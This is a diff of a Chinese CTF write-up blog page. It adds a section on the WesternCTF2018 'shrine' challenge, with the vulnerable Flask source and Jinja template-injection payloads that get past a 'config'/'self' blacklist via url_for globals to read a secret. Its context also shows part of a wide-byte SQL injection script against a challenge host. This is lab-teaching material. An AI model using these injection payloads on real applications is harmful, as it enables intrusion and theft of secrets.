@@ -100,7 +100,7 @@
           <!-- Date -->
           <span class="date-time info">On
             <span class="date">2020-02-20</span>
-            <span class="time">20:13:08</span>
+            <span class="time">06:19:58</span>
           </span>
           
         </div>
@@ -160,6 +160,37 @@
 		pdo += '||&#123;&#125;<span class="hljs-symbol">%271</span>&#123;&#125;<span class="hljs-symbol">%27</span>=&#123;&#125;<span class="hljs-symbol">%271</span>'.format(<span class="hljs-string">"%df"</span>,<span class="hljs-string">"%df"</span>,<span class="hljs-string">"%df"</span>)
 		url = 'http://<span class="hljs-number">6627</span>a<span class="hljs-number">3</span>ecadb<span class="hljs-number">74</span>fc<span class="hljs-number">8</span>a<span class="hljs-number">015</span><span class="hljs-keyword">c</span><span class="hljs-number">12</span>efa<span class="hljs-number">10641461</span>b<span class="hljs-number">80</span>f<span class="hljs-number">02696</span><span class="hljs-keyword">c</span><span class="hljs-number">4583</span>.changame.ichunqiu.com/?id=<span class="hljs-number">1</span><span class="hljs-symbol">%df</span><span class="hljs-symbol">%27</span><span class="hljs-comment">;&#123;&#125;'.format(pdo)</span></code></pre>
 
+<h1 id="WesternCTF2018-shrine-1"><a href="#WesternCTF2018-shrine-1" class="headerlink" title="[WesternCTF2018]shrine 1"></a>[WesternCTF2018]shrine 1</h1><p>源码如下</p>
+<pre><code class="hljs undefined"><span class="hljs-keyword">import</span> flask
+<span class="hljs-keyword">import</span> os
+
+app = flask.Flask(__name__)
+
+app.config[<span class="hljs-string">'FLAG'</span>] = os.environ.pop(<span class="hljs-string">'FLAG'</span>)
+
+<span class="hljs-meta">@app.route('/')</span>
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">index</span><span class="hljs-params">()</span>:</span>
+    <span class="hljs-keyword">return</span> open(__file__).read()
+
+<span class="hljs-meta">@app.route('/shrine/&lt;path:shrine&gt;')</span>
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">shrine</span><span class="hljs-params">(shrine)</span>:</span>
+
+    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">safe_jinja</span><span class="hljs-params">(s)</span>:</span>
+        s = s.replace(<span class="hljs-string">'('</span>, <span class="hljs-string">''</span>).replace(<span class="hljs-string">')'</span>, <span class="hljs-string">''</span>)
+        blacklist = [<span class="hljs-string">'config'</span>, <span class="hljs-string">'self'</span>]
+        <span class="hljs-keyword">return</span> <span class="hljs-string">''</span>.join([<span class="hljs-string">'&#123;&#123;% set &#123;&#125;=None%&#125;&#125;'</span>.format(c) <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> blacklist]) 
+        + s
+
+    <span class="hljs-keyword">return</span> flask.render_template_string(safe_jinja(shrine))
+
+<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">'__main__'</span>:
+    app.run(debug=<span class="hljs-literal">True</span>)
+
+首先在shrine路径下测试ssti能正常执行
+
+/shrine/&#123;&#123; <span class="hljs-number">4</span>*<span class="hljs-number">4</span> &#125;&#125;</code></pre>
+
+<p>果然有,但是这跟之前的安恒月赛的一道题不同,这个是flag存在变量,而不是执行命令<br><code>app.config[&#39;FLAG&#39;] = os.environ.pop(&#39;FLAG&#39;)</code><br>可以看出flag存在app的变量config中的,本来直接就可以查看,但是黑名单过滤了<br>不过python还有一些内置函数，比如url_for和get_flashed_messages<br>/shrine/<br>可以查看到表示当前app的另一个词<br><img src="https://img-blog.csdnimg.cn/20200301191331235.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzMjM1NDA2,size_16,color_FFFFFF,t_70" alt="app"><br>可以通过数组访问<br>url_for.<strong>globals</strong>[‘current_app’].config查看flag<br><img src="https://img-blog.csdnimg.cn/20200301191457118.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzMjM1NDA2,size_16,color_FFFFFF,t_70" alt="flag"></p>
 
         </div>
       </div>
